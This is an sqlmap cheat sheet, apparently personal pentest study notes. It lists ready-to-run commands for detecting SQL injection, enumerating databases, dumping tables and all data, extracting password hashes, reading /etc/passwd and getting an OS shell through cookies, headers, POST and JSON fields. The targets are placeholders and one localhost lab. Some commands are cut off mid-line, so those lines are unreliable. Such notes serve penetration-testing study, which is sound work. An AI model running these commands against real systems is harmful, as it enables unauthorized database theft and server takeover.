
[[1. SQLi]]

## 🧠 SQLMap: **Zero to Hero – Full-Scope Exploitation Guide**


## What is SqlMap ? 

- `sqlmap` is a fully automated **SQL injection and database takeover tool.**
- *It identifies vulnerabilities, fingerprints the DBMS, enumerates  databases/tables/users, extracts data, bypasses protections, and even drops backdoors.*

## 📚 II. Core SQL Injection Types sqlmap Handles

| Injection Type                    | Description                                          |
| --------------------------------- | ---------------------------------------------------- |
| ✅ **Boolean-based Blind**         | Responses differ based on true/false logic           |
| ✅ **Time-based Blind**            | Exploits query execution delays                      |
| ✅ **Error-based**                 | Uses DB error messages to extract info               |
| ✅ **UNION-based**                 | Combines multiple SELECTs to extract data            |
| ✅ **Stacked Queries**             | Executes multiple SQL queries in one shot            |
| ✅ **Inline Query / Second-Order** | Injection occurs in one request, executed in another |

---
## 🧪 III. Phase-by-Phase sqlmap Progression

### 1️⃣ **Recon & Basic Testing**

#### 🔧 Basic GET Param Injection

`sqlmap -u "http://target.com/page.php?id=1" --batch`
#### 🔧 POST Form Field Injection

`sqlmap -u "http://target.com/login.php" --data="username=admin&password=123" --batch`

---
### 2️⃣ **Database Discovery & Enumeration**

### 🎯 List DBMS & Banner

`sqlmap -u URL --banner
### 🎯 List Databases

`sqlmap -u URL --dbs`

### 🎯 List Tables in a DB

`sqlmap -u URL -D database_name --tables`

### 🎯 List Columns in a Table

`sqlmap -u URL -D database_name -T table_name --columns`

### 🎯 Dump Table Data

`sqlmap -u URL -D database_name -T table_name --dump`

___
### 3️⃣ **Authentication Handling**

#### 🔑 Cookie-Based Injection

`sqlmap -u URL --cookie="session=abc 123*"`
#### 🔑 HTTP Basic Auth

`sqlmap -u URL --auth-type=basic --auth-cred=user:pass`
#### 🔑 Login Form Session Preservation
-  Capture request in Burp → Save to request. Txt

`sqlmap -r request. Txt --batch`

___
### 4️⃣ **Advanced Extraction Flags**

#### 🔐 Extract Passwords & Hashes

`sqlmap -u URL --passwords`

#### 🔐 Extract Usernames & Privileges

`sqlmap -u URL --users --roles --privileges`

#### 🔐 Extract File Content

`sqlmap -u URL --file-read="/etc/passwd"`

#### 💣 Upload Web Shell

`sqlmap -u URL --os-shell`

---
### 5️⃣ **Injection Target Precision**

### 🎯 Inject Into Cookie

`sqlmap -u URL --cookie="session=abc123*" --batch`

### 🎯 Inject Into Cookie (Enhanced Version)

`sqlmap -u URL --cookie="session=1*" --level=5 --risk=3 --technique=BEUSTQ --dump`

### 🎯 Inject Into Cookie with post data (Enhanced Version)

`sqlmap -u "http://localhost/labs/i0x02.php"--cookie="session=6967 cabefd 763 ac 1 a 1 a 88 e 11159957 db*" --data="username=jeremy&password=jeremy" --level=5 --risk=3 --technique=BEUSTQ --batch`

#### 🎯 Inject Into Headers

`sqlmap -u URL --headers="User-Agent: Mozilla/5.0*"`

#### 🎯 Inject Into POST Data

`sqlmap -u URL --data="search=abc*" --batch`

#### 🎯 Second-Order Injection

`sqlmap -u URL --data="username=abc" --second-order="http://targe`

---
## 6️⃣ **Payload Types and Modes**

#sqlmap-techniques

| **Technique** | **Flag**        | **Description**     |
| ------------- | --------------- | ------------------- |
| **B**         | `--technique=B` | Boolean-based blind |
| **E**         | `--technique=E` | Error-based         |
| **U**         | `--technique=U` | UNION query-based   |
| **S**         | `--technique=S` | Stacked queries     |
| **T**         | `--technique=T` | Time-based blind    |
| **Q**         | `--technique=Q` | Inline queries      |

---
### 7️⃣ Real-World Scenarios (and flags)

#### 🔍 Authenticated Panel Injection

- Capture POST request after login
    
- Save to `login.txt`
    

`sqlmap -r login.txt --level=5 --risk=3 --technique=BEUSTQ --batch`

#### 🔍 API Token Injection

`sqlmap -u URL --headers="X-API-KEY: token123*" --batch`

#### 🔍 JSON Injection

`sqlmap -u URL --data='{"search":"abc*"}' --batch --headers="Conten`

___
# 🧠 8️⃣ Understanding sqlmap Intelligence

### 💡 Risk Levels:

|Risk|Description|
|---|---|
|1|Safe, non-destructive payloads|
|2|Adds UNION/stacked queries|
|3|Includes time-based / heavy tests|

### 💡 Level:

|Level|Description|
|---|---|
|1|Basic params (GET only)|
|5|Includes GET, POST, headers, cookies, User-Agent|

---
# 🧙‍♂️ 9️⃣ sqlmap: Black Belt Moves

## 🔄 Mirror Entire DB

`sqlmap -u URL --dump-all`